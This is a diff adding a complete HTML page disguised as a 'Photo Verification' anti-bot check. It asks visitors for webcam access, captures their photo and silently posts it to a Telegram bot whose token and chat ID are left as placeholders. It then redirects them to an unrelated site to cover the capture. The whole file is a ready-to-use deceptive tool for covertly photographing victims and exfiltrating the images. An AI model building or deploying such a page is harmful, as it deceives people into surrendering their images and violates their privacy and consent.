@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #1d3557, #457b9d);
+            color: white;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        h1 {
+            font-size: 2.5em;
+        }
+        p {
+            font-size: 1.2em;
+        }
+        button {
+            background: #e63946;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1em;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #d62839;
+        }
+        video {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 400px;
+            border: 5px solid white;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="home">
+        <h1>Photo Verification</h1>
+        <p>Please capture a photo for security reasons to prove you are a human and not a bot.</p>
+        <button id="start">Start Verification</button>
+    </div>
+    <div id="camera" style="display: none;">
+        <video id="video" autoplay></video>
+        <button id="capture">Capture Photo</button>
+    </div>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const homeDiv = document.getElementById('home');
+        const cameraDiv = document.getElementById('camera');
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('capture');
+        const startButton = document.getElementById('start');
+        const canvas = document.getElementById('canvas');
+
+        // Start Verification Process
+        startButton.addEventListener('click', () => {
+            homeDiv.style.display = 'none';
+            cameraDiv.style.display = 'block';
+
+            // Start video stream
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    alert("Camera access is required to continue.");
+                    console.error(err);
+                });
+        });
+
+        // Capture Photo
+        captureButton.addEventListener('click', () => {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert photo to blob and send to Telegram
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, 'image/jpeg');
+        });
+
+        // Send Photo to Telegram Bot
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', '<Your_Chat_ID>');
+            formData.append('photo', blob);
+
+            fetch(`https://api.telegram.org/bot<Your_Bot_Token>/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Photo sent to Telegram:", data);
+                // Redirect to the link
+                window.location.href = "https://stars.chromeexperiments.com/";
+            })
+            .catch(error => {
+                console.error("Error sending photo:", error);
+            });
+        }
+    </script>
+</body>
+</html>
